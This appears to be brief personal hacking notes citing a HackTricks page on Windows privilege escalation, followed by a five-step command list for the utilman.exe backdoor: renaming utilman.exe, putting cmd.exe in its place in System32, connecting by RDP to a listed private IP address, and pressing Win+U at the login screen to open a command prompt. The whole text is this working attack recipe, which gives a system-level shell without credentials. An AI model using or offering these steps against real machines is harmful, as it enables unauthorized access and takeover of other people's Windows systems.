[https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens](#https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)


-  cd C:\\Windows\\System32
-  ren utilman\.exe utilman\.old
-  ren cmd\.exe utilman\.exe
-  rdp 192\.168\.209\.165
-  WIN \+ u  -  opens cmd\.exe 